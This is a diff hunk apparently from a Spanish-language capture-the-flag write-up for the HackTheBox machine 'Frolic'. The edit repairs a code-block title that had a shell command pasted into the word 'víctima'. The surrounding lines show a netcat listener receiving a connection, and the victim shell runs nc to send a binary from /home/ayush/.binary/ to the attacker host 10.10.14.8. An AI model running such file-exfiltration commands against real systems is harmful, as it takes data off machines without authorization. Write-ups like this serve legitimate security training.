@@ -447,7 +447,7 @@ listening on [any] 4444 ...
 connect to [10.10.14.8] from (UNKNOWN) [10.10.10.111] 42698
 ```
 
-```bash title="Máquina víctwww-data@frolic:~/html/playsms$ nc 10.10.14.8 4444 < /home/ayush/.binary/ropima"
+```bash title="Máquina víctima"
 www-data@frolic:~/html/playsms$ nc 10.10.14.8 4444 < /home/ayush/.binary/rop
 ```
 
